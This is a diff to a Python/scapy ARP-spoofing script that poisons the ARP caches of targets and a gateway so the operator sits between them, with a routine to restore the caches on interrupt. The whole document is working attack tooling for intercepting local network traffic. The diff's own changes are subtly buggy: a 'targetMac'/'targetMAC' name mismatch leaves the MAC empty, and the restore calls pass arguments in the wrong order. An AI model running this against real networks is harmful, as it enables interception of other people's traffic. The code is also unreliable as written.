@@ -42,7 +42,7 @@ def enable_ip_route(verbose=True):
     if verbose:
         print("[!] IP Routing enabled.")
 
-def spoof(targetIP, hostIP, verbose=True):
+def spoof(targetIP, hostIP, devices, verbose=True):
     """
     Spoofs `targetIP` saying that we are `hostIP`.
     it is accomplished by changing the ARP cache of the target (poisoning)
@@ -50,7 +50,11 @@ def spoof(targetIP, hostIP, verbose=True):
     # craft the arp 'is-at' operation packet, in other words; an ARP response
     # we don't specify 'hwsrc' (source MAC address)
     # because by default, 'hwsrc' is the real MAC address of the sender (ours)
-    targetMac = scan(targetIP)[0]["mac"]
+    targetMac = ""
+    for item in devices:
+        if item["ip"] == targetIP:
+            targetMAC = item["mac"]
+
     arpResponse = scapy.ARP(pdst=targetIP, hwdst=targetMac, psrc=hostIP, op='is-at')
 
     scapy.send(arpResponse, verbose=False)
@@ -59,15 +63,22 @@ def spoof(targetIP, hostIP, verbose=True):
         selfMac = scapy.ARP().hwsrc
         print("[+] Sent to {} : {} is-at {}".format(targetIP, hostIP, selfMac))
 
-def restore(targetIP, hostIP, verbose=True):
+def restore(targetIP, hostIP, devices, verbose=True):
     """
     Restores the normal process of a regular network
     This is done by sending the original informations
     (real IP and MAC of `host_ip` ) to `target_ip`
     """
 
-    targetMAC = scan(targetIP)[0]["mac"]
-    hostMAC = scan(hostIP)[0]["mac"]
+    targetMac = ""
+    for item in devices:
+        if item["ip"] == targetIP:
+            targetMAC = item["mac"]
+
+    hostMAC = ""
+    for item in devices:
+        if item["ip"] == hostIP:
+            hostMAC = item["mac"]
 
     # crafting the restoring packet
     arp_response = scapy.ARP(pdst=targetIP, hwdst=targetMAC, psrc=hostIP, hwsrc=hostMAC)
@@ -104,13 +115,13 @@ if __name__ == "__main__":
         while True:
             for target in targets:
                 # telling the `target` that we are the `host`
-                spoof(target, host, verbose)
+                spoof(target, host, devices, verbose)
                 # telling the `host` that we are the `target`
-                spoof(host, target, verbose)
+                spoof(host, target, devices, verbose)
             time.sleep(1)
     except KeyboardInterrupt:
         print("[!] Detected CTRL+C ! restoring the network, please wait...")
         for target in targets:
-            restore(target, host, verbose)
-            restore(host, target, verbose)
+            restore(target, host, verbose, devices)
+            restore(host, target, verbose, devices)
         print("[+] Arp Spoof Stopped")
